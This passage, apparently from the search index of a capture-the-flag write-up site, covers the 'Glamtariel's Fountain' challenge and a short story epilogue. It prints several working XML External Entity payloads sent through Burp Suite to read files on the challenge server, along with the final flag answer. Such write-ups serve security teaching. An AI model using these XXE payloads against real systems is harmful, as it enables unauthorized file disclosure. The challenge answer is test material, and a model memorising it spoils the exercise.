anywhere Blue Ring Princess I love these fancy blue rings! You can see I have two of them. Not magical or anything, just really pretty. If asked, Glamtariel definitely tries to insist that the blue ones are her favorites. I'm not so sure though. Blue Ring Fountain I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things. Glamtariel can be pretty tight lipped about some things. Silver Ring Princess Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file. Wait a minute! Uh, promise me you won't tell anyone. I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that. Silver Ring Fountain You know what one of my favorite songs is? Silver rings, silver rings .... Glamtariel may not have one of these silver rings in her collection, but I've overheard her talk about how much she'd like one someday. Red Ring Princess Ah, the fiery red ring! I'm definitely proud to have one of them in my collection. I think Glamtariel might like the red ring just as much as the blue ones, perhaps even a little more. Red Ring Fountain Hmmm, you seem awfully interested in these rings. Are you looking for something? I know I've heard through the ice cracks that Kringle is missing a special one. You know, I've heard Glamtariel talk in her sleep about rings using a different TYPE of language. She may be more responsive about them if you ask differently. From this last set of dialog we learn the following The princes keeps track of her rings in a RINGLIST that uses a SIMPLE FORMAT. The princess has 2 blue rings The princess has a red ring The princess doesn't have a silver ring in here collection, but she wants one. If we ask the princess about rings using a different TYPE of language, we may be more responsive.","title":"Setup"},{"location":"quests/Recover_the_Web_Ring/10_Glamtariels_Fountain/#solution","text":"Starting from one of the first clues, we want to watch the web traffic as we interact with the site. Stating Burp Suite we learn that every time an object is moved a POST request is sent to the /dropped URL, sending data using the JSON Content Type. { \"imgDrop\" : \"img1\" , \"who\" : \"princess\" , \"reqType\" : \"json\" } Some experimentation tells us that img1 is the top right object, img2 is the top left, img3 is the bottom right, and img4 is the bottom left. There was numerous mentions of TYPE in the dialogs, with indications that the princess can understand more than one. HTML POST requests can format the information submitted using several Content Types, but the most common are JSON and XML. We see from the data in the POST that it is using JSON, but what if we send the same data using the XML format? To do this, send the POST request to the Burp repeater, and modify it as follows. Change the Content-Type in the header to application/xml Change the content to the XML format <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <root> <imgDrop> img1 </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Inspecting the response packet we see different dialog from both the princess and the fountain. Object Dropped On Princess Fountain any princess I love rings of all colors! She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though. any fountain I'm one of the few who can discuss anything using that TYPE of language. Yeah, I can understand a bit, but not communicate with it at all. The only thing we really learn from this is that the princess understands XML. Referring back to the hint from Hal Tandybuck, XML External Entity (XXE) Processing seems to be an option. This technique allows us to reference some external entity in our XML input, such as files on the local system. We've learned that an APP PATH is involved, and there is a RINGFILE in a SIMPLE FORMAT, so if we can deduce the name of a file we may be able to retrieve it using XXE. Looking at the web traffic again we see that image files representing the objects on the site that we can interact with are located in the directory /static/images . If we deduce that the web application is in a directory called APP, and that the file is RINGFILE.TXT, then the local file we want to access is /app/static/images/ringfile.txt . The following XML will use XXE to send this file to the princess. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/ringlist.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain xxe princess Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this. She really does try to keep things safe. Best just to put it away. (click) In addition to the above dialog, we also have a value in the previously unused 'visit' property, telling us to go to https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png,262px,100px , where we get the following image. This image references two files in the folder x_phial_pholder_2022 , bluering.txt and redring.txt . Next we use XXE to \"give\" these rings to the princess. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/bluering.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain bluering.txt princess I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty. She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though. Note that this is the same dialog from when we dropped a blue ring on the princess though the web UI. Next, try the red ring. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/redring.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain redring.txt princess Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice. Oooooh, I can just tell she'd like to talk about them some more. Not quite the same dialog as when we dropped the red ring on the princess through the web UI, but the fountain is encouraging us to continue. Remembering that the princess wants a silver ring, lets see if we can give her one. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/silverring.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain silverring.txt princess I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!. Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum! We also now have another value in the 'visit' property, telling us to go to https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px , where we get the following image. Zooming in on this and rotating it we see the text goldring_to_be_deleted.txt , so we now give that to the princess. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop> &xxe; </imgDrop> <who> princess </who> <reqType> xml </reqType> </root> Object Dropped On Princess Fountain goldring_to_be_deleted.txt princess Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them. She's definitely hiding something. The princess tells us here that she thought we were going to give her the silver ring. She also makes reference to a REQ and TYPE. Noting that reqType is one of the parameters in the POST content, and the silver ring is image #1 on the web page, we create the following XML request. <?xml version=\"1.0\" encoding=\"UTF-8\" ?> <!DOCTYPE root[ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop> img1 </imgDrop> <who> princess </who> <reqType> &xxe; </reqType> </root> Object Dropped On Princess Fountain silverring.txt princess No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations! Wow, I have never seen that before! She must really trust you! Along with the above dialog, we get the following URL reference in the 'visit' parameter. https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px Answer goldring-morethansupertopsecret76394734.png","title":"Solution"},{"location":"quests/Visit_Santa_in_the_Castle/","text":"Visit Santa in the Castle This objective unlocks after you have collected the 5 rings. To complete it just go back to the North Pole and enter the Castle. Santa Congratulations! You have foiled Grinchum's foul plan and recovered the Golden Rings! And by the magic of the rings, Grinchum has been restored back to his true, merry self: Smilegol! You see, all Flobbits are drawn to the Rings, but somehow, Smilegol was able to snatch them from my castle. To anyone but me, their allure becomes irresistable the more Rings someone possesses. That allure eventually tarnishes the holder's Holiday Spirit, which is about giving, not possesing. That's exactly what happened to Smilegol; that selfishness morphed him into Grinchum. But thanks to you, Grinchum is no more, and the holiday season is saved! Ho ho ho, happy holidays!","title":"Visit Santa in the Castle"},{"location":"quests/Visit_Santa_in_the_Castle/#visit-santa-in-the-castle","text":"This objective unlocks after you have collected the 5 rings. To complete it just go back to the North Pole and enter the Castle. Santa Congratulations! You have foiled Grinchum's foul plan and recovered the Golden Rings! And by the magic of the rings, Grinchum has been restored back to his true, merry self: Smilegol! You see, all Flobbits are drawn to the Rings, but somehow, Smilegol was able to snatch them from my castle. To anyone but me, their allure becomes irresistable the more Rings someone possesses. That allure eventually tarnishes the holder's Holiday Spirit, which is about giving, not possesing. That's exactly what happened to Smilegol; that selfishness morphed him into Grinchum. But thanks to you, Grinchum is no more, and the holiday season is saved! Ho ho ho, happy holidays!","title":"Visit Santa in the Castle"}]}